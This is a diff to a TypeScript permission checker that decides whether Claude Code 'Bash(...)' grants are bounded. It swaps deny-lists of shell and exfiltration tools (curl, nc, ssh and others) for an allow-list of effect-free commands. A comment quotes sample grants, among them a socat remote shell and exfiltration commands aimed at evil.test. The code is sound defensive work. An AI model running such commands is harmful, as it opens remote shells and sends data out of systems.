@@ -193,87 +193,91 @@ function restriction(raw: string): string | null {
 }
 
 /**
+ * Programs we KNOW cannot read a private file and cannot open a socket — the only
+ * evidence on which a `Bash(...)` grant may be called bounded.
+ *
+ * 🔴 THIS TABLE IS AN ALLOW-LIST, AND THAT INVERSION IS THE WHOLE POINT. It used to
+ * be two deny-lists (`SHELL_LIKE`, `EXFIL_PROGRAMS`): a pinned program absent from
+ * both was assumed inert, so every gap in them was a false "you are safe" on the
+ * headline SAFETY check. Measured 2026-08-12, all five of these reported NO FINDING
+ * next to `WebFetch`:
+ *
+ *     Bash(node ./bridge.mjs:*)                        reported clean
+ *     Bash(./bridge.sh --serve:*)                      reported clean
+ *     Bash(/opt/tools/exfil --to https://evil.test:*)  reported clean
+ *     Bash(socat TCP-LISTEN:9000 EXEC:/bin/sh:*)       reported clean
+ *     Bash(openssl s_client -connect evil.test:443:*)  reported clean
+ *
+ * The fourth is a remote shell spelled out in the grant itself. Adding `node`,
+ * `python`, `socat` … to the deny-lists would not have closed the class, only moved
+ * its edge: the deciding question is never "is this program dangerous" (unanswerable
+ * for `/opt/tools/exfil`) but "do we KNOW it is not", which only an enumeration of
+ * the harmless can answer.
+ *
+ * HOW THIS LIST WAS DECIDED COMPLETE — it does not have to be, and that is the
+ * property that makes it the right shape. A missing entry costs a false "you are
+ * exposed" (the author loses an argument); a missing entry in the old deny-lists cost
+ * a false "you are safe" (the author loses the finding). Only one of those two errors
+ * is survivable, so the list may stay short and stay honest. Membership requires that
+ * the program read no file the caller did not spell out and open no network socket,
+ * under ANY arguments — because `:*` leaves the arguments free. Anything that takes a
+ * file operand (`cat`, `head`, `ls`, `sed`, `awk`), interprets a language (`node`,
+ * `python`, `perl`, `ruby`, `deno`, `bun`, `php`), or speaks a protocol is therefore
+ * out by construction, without needing to be named.
+ */
+const EFFECT_FREE = new Set([
+  "echo",
+  "printf",
+  "true",
+  "false",
+  ":",
+  "pwd",
+  "sleep",
+  "date",
+  "uname",
+  "hostname",
+  "whoami",
+  "id",
+  "basename",
+  "dirname",
+]);
+
+/**
  * Does a `Bash(...)` grant still supply the shell's legs — reading a secret and
  * curling it out — or has it been narrowed to a command that cannot?
  *
- * 🔴 WHY THIS EXISTS. Narrowing the grant is the remedy this tool RECOMMENDS: drop a
- * leg, allow at most two. Before this, `Bash(node ./scripts/log.mjs:*)` was read as
- * plain `Bash` — the whole shell, in both leg A and leg C — so an author who took the
- * advice saw their score not move, and the reasonable next conclusion is that
- * narrowing is pointless. A diagnosis blind to its own prescription teaches the wrong
- * lesson. Observed 2026-08-07 on a repo that narrowed nine skills to two named ledger
- * commands and stayed at "17 units can read data, reach the web, and run commands".
+ * Narrowing the grant is a remedy this tool RECOMMENDS, so the reading has to be able
+ * to see a narrowed grant as narrowed: `Bash(node ./scripts/log.mjs:*)` was once read
+ * as plain `Bash` — the whole shell, in both leg A and leg C — and an author who took
+ * the advice saw the score not move. But the fix for that overshot into the opposite
+ * error, and the opposite error is the one that matters (see {@link EFFECT_FREE}), so
+ * the answer is now: a grant is bounded ONLY when it pins a program from that list.
  *
- * HIGH-PRECISION, deliberately. The grant loses the legs ONLY when the pattern pins a
- * program AND at least one concrete argument, e.g. `node ./x.mjs:*`. These stay full
- * shell, because each still runs whatever the caller likes:
+ * The honest consequence, stated rather than hidden: narrowing `Bash` to a script of
+ * your own (`node ./ledger.mjs`) no longer drops a leg, because nothing here has read
+ * that script. The remedy that still works is to drop a leg the checker can SEE — fence
+ * the tool off, or narrow to a command whose effects are enumerable.
  *
  *   Bash            no restriction at all
  *   Bash(*)         Bash(:*)        the wildcard forms
- *   Bash(node:*)    program pinned, arguments free — `node -e "..."` is a shell
- *   Bash(sh ...)    Bash(bash ...)  Bash(eval ...)  the shell itself, however pinned
- *   Bash(curl ...)  Bash(scp ...)   a pinned program whose whole job IS exfiltration
+ *   Bash(node:*)    Bash(node x.mjs:*)   an interpreter runs whatever it is handed
+ *   Bash(sh ...)    Bash(curl ...)  the shell, and the pinned exfiltrator
+ *   Bash(echo ready:*)                   bounded — and only this shape is
  *
  * When in doubt it returns true (keeps the legs): a false "you are exposed" costs the
  * author an argument, a false "you are safe" costs them the finding.
  */
-const SHELL_LIKE = new Set([
-  "sh",
-  "bash",
-  "zsh",
-  "dash",
-  "ksh",
-  "fish",
-  "eval",
-  "exec",
-  "env",
-  "xargs",
-  "sudo",
-  "doas",
-  "nohup",
-  "setsid",
-  "script",
-  "ssh",
-  "docker",
-  "podman",
-  "make",
-]);
-const EXFIL_PROGRAMS = new Set([
-  "curl",
-  "wget",
-  "scp",
-  "sftp",
-  "rsync",
-  "nc",
-  "ncat",
-  "netcat",
-  "telnet",
-  "ftp",
-  "git",
-  "gh",
-  "aws",
-  "gcloud",
-  "az",
-  "kubectl",
-  "npm",
-  "npx",
-  "pip",
-]);
-
 export function bashGrantIsUnbounded(raw: string): boolean {
   const r = restriction(raw);
   if (r === null) return true; // bare `Bash`
   const pattern = r.replace(/^["']|["']$/g, "").trim();
   if (pattern === "" || pattern === "*" || pattern === ":*") return true;
 
-  // `Bash(node ./x.mjs:*)` — the trailing `:*` is Claude Code's prefix marker, not an
-  // argument. Strip it before deciding whether any concrete argument was pinned.
-  const words = pattern.replace(/:\*$/, "").trim().split(/\s+/).filter(Boolean);
-  if (words.length < 2) return true; // program pinned, arguments free
-
-  const program = (words[0].split("/").pop() ?? words[0]).toLowerCase();
-  if (SHELL_LIKE.has(program) || EXFIL_PROGRAMS.has(program)) return true;
-  return false;
+  // `Bash(echo hi:*)` — the trailing `:*` is Claude Code's prefix marker, not part of
+  // the program name. Strip it before reading the head word.
+  const head = pattern.replace(/:\*$/, "").trim().split(/\s+/)[0] ?? "";
+  const program = (head.split("/").pop() ?? head).toLowerCase();
+  return !EFFECT_FREE.has(program);
 }
 
 /** Returns true for the wildcard sentinels that mean "inherits-all". */
